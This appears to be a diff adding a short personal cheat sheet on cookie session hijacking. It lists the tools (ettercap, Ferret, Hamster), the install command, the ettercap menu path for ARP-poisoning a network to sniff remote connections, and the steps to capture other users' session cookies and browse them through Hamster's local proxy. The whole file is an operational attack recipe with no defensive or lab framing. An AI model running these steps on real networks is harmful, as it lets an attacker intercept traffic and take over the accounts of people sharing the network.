@@ -1,0 +1,31 @@
+COOKIES HIJACKING
+------------------
+
+1) Required tools
+
+   >> ettercap
+   >> Hamster --> Proxy manipulator of the things grabbed by Ferret
+   >> Ferret
+
+   --> To add Ferret, need to add i-386 architecture
+       >> dpkg --add-architecture i386 && apt-get update && apt-get install
+       	  ferret-sidejack:i386
+
+2) ettercap configuration (easy)
+
+   >> Sniff > Unified Sniffing
+   >> Hosts > Scan for Host
+   >> MITM > Arp Poisoning > Sniff remote connections
+
+   >> Start > Start sniffing
+
+3) Start ferret and hamster
+
+   >> ferret -i <interface>
+   >> hamster
+
+4) Viewing cookie sessions
+
+   >> firefox 127.0.0.1:1234
+   --> adapters --> interface --> Submit query
+
